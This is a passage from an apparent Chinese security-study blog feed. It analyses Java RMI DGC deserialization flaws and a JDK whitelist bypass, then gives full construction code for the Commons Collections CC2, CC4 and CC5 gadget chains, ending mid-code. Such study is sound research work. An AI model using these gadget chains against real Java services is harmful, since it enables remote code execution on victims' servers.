33%;"></p><p>然后调用<code>invoke</code>函数执行方法`</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    result = method.invoke(obj, params);</span><br><span class="line">&#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">    <span class="keyword">throw</span> e.getTargetException();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后把返回值序列化后传递回去</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ObjectOutput</span> <span class="variable">out</span> <span class="operator">=</span> call.getResultStream(<span class="literal">true</span>);</span><br><span class="line">Class&lt;?&gt; rtype = method.getReturnType();</span><br><span class="line"><span class="keyword">if</span> (rtype != <span class="keyword">void</span>.class) &#123;</span><br><span class="line">    marshalValue(rtype, result, out);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="dgc客户端请求服务端">DGC(客户端请求服务端)</h3><blockquote><p>在前面的过程中建立了<code>DGCImpl</code> 类，这是 Java RMI框架中的一个类，代表分布式垃圾回收 (Distributed Garbage Collection, DGC)的实现。<code>dispatch</code> 函数在 <code>DGCImpl_Skel</code>类中主要负责处理与分布式垃圾回收相关的远程方法调用。</p><p>分布式垃圾回收用于管理在分布式系统中引用对象的生命周期。为了实现这一点，<code>DGCImpl</code>类通常提供的方法包括：</p><ol type="1"><li><code>dirty</code>：用于注册一个对象的引用。</li><li><code>clean</code>：用于注销一个对象的引用。</li></ol></blockquote><p>特点：自动生成，只要创建了远程对象就一定会创建DGC</p><p>创建完远程对象，会把所有的变量放在target中，然后放在一个静态表中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">exportObject</span><span class="params">(Target target)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    target.setExportedTransport(<span class="built_in">this</span>);</span><br><span class="line">    ObjectTable.putTarget(target);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">putTarget</span><span class="params">(Target target)</span> <span class="keyword">throws</span> ExportException &#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">objTable.put(oe, target);</span><br><span class="line">    implTable.put(weakImpl, target);</span><br><span class="line">    <span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>但在put之前，objTable表中已经有了一个Target类，也有一个stub(DGCImpl_Stub)，说明在这之前已经创建了DGCImpl_Stub实例对象</p><p><img src="/post/a787da62/image-20240617211152942.png" alt="image-20240617211152942" style="zoom:33%;"></p><p>回过头看DGCImpl_Stub实例对象的创建过程，事实上，在putTarget函数中就有该过程</p><p><img src="/post/a787da62/image-20240617211342125.png" alt="image-20240617211342125" style="zoom:50%;"></p><p>这里的dgcLog是DGCImpl类的静态变量，当引用静态变量时，会执行静态代码块static{}里的内容，查看DGCImpl的static{}里的内容，也就是会执行此处的run函数</p><p><img src="/post/a787da62/image-20240617211647714.png" alt="image-20240617211647714" style="zoom:33%;"></p><p>在run函数后面，会新建DGCImpl类对象，并新建LiveRef类对象，接着新建UnicastServerRef对象，并设置stub，设置skel，新建target，并通过put将target放入静态表中，这里创建的DGCImpl的功能和注册中心是一样的，也是有一个端口，建立的是实例对象而非动态代理对象，用于远程回收服务，调用时也是一样的，会调用其disp的dispatch方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">dgc = <span class="keyword">new</span> <span class="title class_">DGCImpl</span>();</span><br><span class="line"><span class="type">ObjID</span> <span class="variable">dgcID</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(ObjID.DGC_ID);</span><br><span class="line"><span class="type">LiveRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LiveRef</span>(dgcID, <span class="number">0</span>);</span><br><span class="line"><span class="type">UnicastServerRef</span> <span class="variable">disp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastServerRef</span>(ref);</span><br><span class="line"><span class="type">Remote</span> <span class="variable">stub</span> <span class="operator">=</span></span><br><span class="line">    Util.createProxy(DGCImpl.class,</span><br><span class="line">                     <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(ref), <span class="literal">true</span>);</span><br><span class="line">disp.setSkeleton(dgc);</span><br><span class="line"></span><br><span class="line"><span class="type">Permissions</span> <span class="variable">perms</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Permissions</span>();</span><br><span class="line">perms.add(<span class="keyword">new</span> <span class="title class_">SocketPermission</span>(<span class="string">&quot;*&quot;</span>, <span class="string">&quot;accept,resolve&quot;</span>));</span><br><span class="line">ProtectionDomain[] pd = &#123; <span class="keyword">new</span> <span class="title class_">ProtectionDomain</span>(<span class="literal">null</span>, perms) &#125;;</span><br><span class="line"><span class="type">AccessControlContext</span> <span class="variable">acceptAcc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AccessControlContext</span>(pd);</span><br><span class="line"></span><br><span class="line"><span class="type">Target</span> <span class="variable">target</span> <span class="operator">=</span> AccessController.doPrivileged(</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>&lt;Target&gt;() &#123;</span><br><span class="line">        <span class="keyword">public</span> Target <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Target</span>(dgc, disp, stub, dgcID, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, acceptAcc);</span><br><span class="line"></span><br><span class="line">ObjectTable.putTarget(target);</span><br></pre></td></tr></table></figure><h4 id="dgcimpl_stub客户端">DGCImpl_stub(客户端)</h4><p>dirty函数中，调用了invoke(存在风险)</p><p><img src="/post/a787da62/image-20240617212457265.png" alt="image-20240617212457265" style="zoom:33%;"></p><p>除此之外还有反序列化漏洞</p><p><img src="/post/a787da62/image-20240617212619027.png" alt="image-20240617212619027" style="zoom:33%;"></p><p>clean函数中，也调用了invoke(存在风险)</p><p><img src="/post/a787da62/image-20240617212533978.png" alt="image-20240617212533978" style="zoom:33%;"></p><h4 id="dgcimpl_skel服务端">DGCImpl_skel(服务端)</h4><p>同样存在漏洞</p><p><img src="/post/a787da62/image-20240617212724556.png" alt="image-20240617212724556" style="zoom: 25%;"><img src="/post/a787da62/image-20240617212745327.png" alt="image-20240617212745327" style="zoom:33%;"></p><h3 id="jdk高版本绕过">JDK高版本绕过</h3><p>约束输入流类型，只有符合白名单的才允许被反序列化，在RegistryImpl类中定义了registryFilter方法</p><p><img src="/post/a787da62/image-20240617213238832.png" alt="image-20240617213238832" style="zoom:33%;"></p><p>在DGC中也有了限制</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> (clazz == ObjID.class ||</span><br><span class="line">        clazz == UID.class ||</span><br><span class="line">        clazz == VMID.class ||</span><br><span class="line">        clazz == Lease.class)</span><br><span class="line">        ? ObjectInputFilter.Status.ALLOWED</span><br><span class="line">        : ObjectInputFilter.Status.REJECTED;</span><br></pre></td></tr></table></figure><p>考虑利用此处的UnicastRef类，存在invoke，存在jrmpclient反序列化攻击，所有rmi客户端</p><p><img src="/post/a787da62/image-20240617213734213.png" alt="image-20240617213734213" style="zoom:33%;"></p><p>思考目标：在服务端开启客户端请求，导致服务端被攻击，也就是怎么在服务端调用UnicastRef类的invoke函数</p><p><img src="/post/a787da62/image-20240622154350020.png" alt="image-20240622154350020" style="zoom:33%;"></p><p>调用invoke的对象大多是Registry_stub和DGCImpl_stub里，stub对象是在createPorxy函数中调用的，而前者的createproxy是在exportObject创建注册中心时创建的，后者在创建远程服务就已经创建了，在DGC的静态代码块和DGCClient类的EndPointEntry函数中都有调用</p><p><img src="/post/a787da62/image-20240617215553337.png" alt="image-20240617215553337" style="zoom: 33%;"></p><p>我们要找到一个反序列化点，通过反序列化能够实现调用此处的函数创建DGCImpl_stub对象，并调用invoke方法</p><ol type="1"><li>在服务端上创建DGCClient对象，创建dgc对象</li><li>让dgc对象在服务端上发起客户端请求，执行invoke函数</li></ol><h4 id="创建dgc对象">创建dgc对象</h4><p>首先找调用DGCClient类的EndPointEntry函数的位置，回溯到StreamRemoteCall的releaseInputStream方法,而这个函数是在skel里被调用，所以可利用，下图是releaseInputStream里调用的registerRefs方法，首先需要保证!incomingRefTable.isEmpty()结果为真，也就是incomingRefTable不为空</p><p><img src="/post/a787da62/image-20240622161211181.png" alt="image-20240622161211181" style="zoom:33%;"></p><p>incomingRefTable是在saveRef中被赋值，saveRef在LiveRef的read中被调用，read方法被UnicastRef的readExternal方法调用，readExternal和readObject类似，在反序列化的时候会被调用，只要实现反序列化UnicastRef对象，就可以实现创建DGC对象，将序列化后的UnicastRef对象传递到RegistyImpl中，由于UnicastRef在白名单，因此可以被正常反序列化，最终实现DGC对象的创建</p><h4 id="调用invoke">调用invoke</h4><p>在DGCClient中创建dgc对象之后，进入了新的线程函数RenewCleanThread</p><p><img src="/post/a787da62/image-20240622162542059.png" alt="image-20240622162542059" style="zoom:50%;"></p><p>在RenewCleanThread中调用了makeDirtyCall函数，makeDirtyCall函数中调用了dirty函数，由此来触发一个客户端请求，从而导致反序列化攻击</p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;初识rmi&quot;&gt;初识RMI&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;概念：Java RMI (Remote Method Invocation)
是一种用于构建分布式应用程序的机制，允许Java对象调用远程服务器上的方法。&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="RMI" scheme="http://example.com/categories/RMI/"/>
    
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>CommonsCollections</title>
    <link href="http://example.com/post/4ffaad45.html"/>
    <id>http://example.com/post/4ffaad45.html</id>
    <published>2024-06-12T07:56:10.000Z</published>
    <updated>2024-09-28T16:17:24.000Z</updated>
    
    <content type="html"><![CDATA[<p>CC2+CC4+CC5+CC7</p><span id="more"></span><h5 id="cc2">CC2</h5><p>添加版本依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>链的后半部分保持不变</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ChainedTransformer.transform()</span><br><span class="line">-----&gt;</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">-----&gt;</span><br><span class="line">TemplatesImpl.newTransformer() </span><br><span class="line">-----&gt;</span><br><span class="line">TemplatesImpl.getTransletInstance() </span><br><span class="line">-----&gt;</span><br><span class="line">TemplatesImpl.defineTransletClasses()(_class[i] = loader.defineClass(_bytecodes[i]);)</span><br><span class="line">_class[_transletIndex].newInstance()</span><br></pre></td></tr></table></figure><p>因此主要是找执行<code>newTransformer</code>的方法，而<code>commons-collections4</code>中存在类<code>TransformingComparator</code>（支持可序列化），该类的<code>compare</code>方法调用了<code>Transformer</code>的<code>transform</code>方法</p><blockquote><p><code>transformer</code>对象负责将输入的对象转换为某种中间形式。比如，如果你有一组复杂的对象，而你只关心其中的某个字段，你可以用<code>transformer</code> 提取这个字段。</p><p><code>decorated</code>对象负责对转换后的中间形式进行比较。它通常是一个比较器（Comparator），定义了比较的逻辑。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(<span class="keyword">final</span> I obj1, <span class="keyword">final</span> I obj2)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">O</span> <span class="variable">value1</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">O</span> <span class="variable">value2</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此只需要构造的时候传递<code>this.transformer</code>为<code>ChainedTransformer</code>对象</p><p>接着就是找反序列化时调用<code>compare</code>函数的对象，此处选择的是<code>PriorityQueue</code>对象（可序列化），该类的<code>readObject</code>对象调用了<code>heapify</code>方法，<code>heapify</code>方法中调用了<code>siftDown</code>方法，<code>siftDown</code>方法调用了<code>siftDownUsingComparator</code>方法，<code>siftDownUsingComparator</code>方法中调用了<code>compare</code>方法，并且此处的<code>comparator</code>可控</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDownUsingComparator</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">half</span> <span class="operator">=</span> size &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (k &lt; half) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">child</span> <span class="operator">=</span> (k &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">c</span> <span class="operator">=</span> queue[child];</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> child + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (right &lt; size &amp;&amp;</span><br><span class="line">            comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>)</span><br><span class="line">            c = queue[child = right];</span><br><span class="line">        <span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        queue[k] = c;</span><br><span class="line">        k = child;</span><br><span class="line">    &#125;</span><br><span class="line">    queue[k] = x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="构造代码">构造代码</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"><span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\java workforse\\java_deserialization\\Hello.class&quot;</span>));</span><br><span class="line"><span class="type">byte</span>[] code2= Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\java workforse\\java_deserialization\\Test.class&quot;</span>));</span><br><span class="line">Class&lt;TemplatesImpl&gt; clazz = TemplatesImpl.class;</span><br><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">// bytecodes的长度设置为2</span></span><br><span class="line">field.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code, code2&#125;);</span><br><span class="line">field= clazz.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field.set(templates, <span class="string">&quot;123&quot;</span>);</span><br><span class="line">field= clazz.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">field= clazz.getDeclaredField(<span class="string">&quot;_transletIndex&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field.set(templates, <span class="number">0</span>);</span><br><span class="line">Transformer[] transforms = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;),</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transforms);</span><br><span class="line"><span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chainedTransformer,<span class="keyword">new</span> <span class="title class_">ComparableComparator</span>&lt;&gt;());</span><br><span class="line"><span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(<span class="number">2</span>,transformingComparator);</span><br><span class="line"><span class="type">Class</span> <span class="variable">clazzPriorityQueue</span> <span class="operator">=</span> PriorityQueue.class;</span><br><span class="line"><span class="type">Field</span> <span class="variable">fieldsize</span> <span class="operator">=</span> clazzPriorityQueue.getDeclaredField(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">fieldsize.setAccessible(<span class="literal">true</span>);</span><br><span class="line">fieldsize.set(priorityQueue,<span class="number">2</span>);</span><br><span class="line">serialize(priorityQueue);</span><br><span class="line">unserialize(<span class="string">&quot;data.bin&quot;</span>);</span><br></pre></td></tr></table></figure><h5 id="cc4">CC4</h5><p>将上面执行代码的方式(<code>InvokerTransformer</code>)改成<code>InstantiateTransformer</code>类的<code>transform</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\java workforse\\java_deserialization\\Hello.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[] code2= Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\java workforse\\java_deserialization\\Test.class&quot;</span>));</span><br><span class="line">        Class&lt;TemplatesImpl&gt; clazz = TemplatesImpl.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// bytecodes的长度设置为2</span></span><br><span class="line">        field.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code, code2&#125;);</span><br><span class="line">        field= clazz.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(templates, <span class="string">&quot;123&quot;</span>);</span><br><span class="line">        field= clazz.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        field= clazz.getDeclaredField(<span class="string">&quot;_transletIndex&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(templates, <span class="number">0</span>);</span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line">        Transformer[] transforms = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transforms);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chainedTransformer,<span class="keyword">new</span> <span class="title class_">ComparableComparator</span>&lt;&gt;());</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(<span class="number">2</span>,transformingComparator);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazzPriorityQueue</span> <span class="operator">=</span> PriorityQueue.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">fieldsize</span> <span class="operator">=</span> clazzPriorityQueue.getDeclaredField(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">        fieldsize.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        fieldsize.set(priorityQueue,<span class="number">2</span>);</span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialize(<span class="string">&quot;data.bin&quot;</span>);</span><br></pre></td></tr></table></figure><h5 id="cc5">CC5</h5><p>链子后半部分不变，仍然是找执行<code>LazyMap</code>的<code>get</code>方法的类，在<code>collections4</code>中，<code>TiedMapEntry</code>的<code>getValue</code>方法调用了其<code>get</code>方法，同时其<code>toString</code>方法调用了<code>getValue</code>方法，由此形成闭环</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Gets a string version of the entry.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> entry as a string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> getKey() + <span class="string">&quot;=&quot;</span> + getValue();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此主要寻找某类，该类的<code>readObject</code>方法调用<code>toString</code>，并且可控制，此处选择的是<code>BadAttributeValueExpException</code>类，该类的<code>readObject</code>方法中的第三个条件片段中执行了<code>toString</code>方法</p><blockquote><p>如果 <code>valObj</code> 是 <code>null</code>，则将 <code>val</code>设为 <code>null</code>。</p><p>如果 <code>valObj</code> 是 <code>String</code> 类型，直接将<code>valObj</code> 赋值给 <code>val</code>。</p><ul><li>如果系统没有安全管理器（即 System.getSecurityManager() ==null），或者 valObj是以下类型之一：<code>Long</code>、<code>Integer</code>、<code>Float</code>、<code>Double</code>、<code>Byte</code>、<code>Short</code>、<code>Boolean</code></li></ul><p>则将 <code>valObj</code> 转换为字符串并赋值给 <code>val</code>。</p></blockquote><p><img src="/post/4ffaad45/image-20240613110449942.png" alt="image-20240613110449942" style="zoom:33%;"></p><p>由此构造代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\java workforse\\java_deserialization\\Hello.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[] code2= Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\java workforse\\java_deserialization\\Test.class&quot;</span>));</span><br><span class="line">        Class&lt;TemplatesImpl&gt; clazz = TemplatesImpl.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// bytecodes的长度设置为2</span></span><br><span class="line">        field.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code, code2&#125;);</span><br><span class="line">        field= clazz.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(templates, <span class="string">&quot;123&quot;</span>);</span><br><span class="line">        field= clazz.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        field= clazz.getDeclaredField(<span class="string">&quot;_transletIndex&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(templates, <span class="number">0</span>);</span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line">        Transformer[] transforms = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title 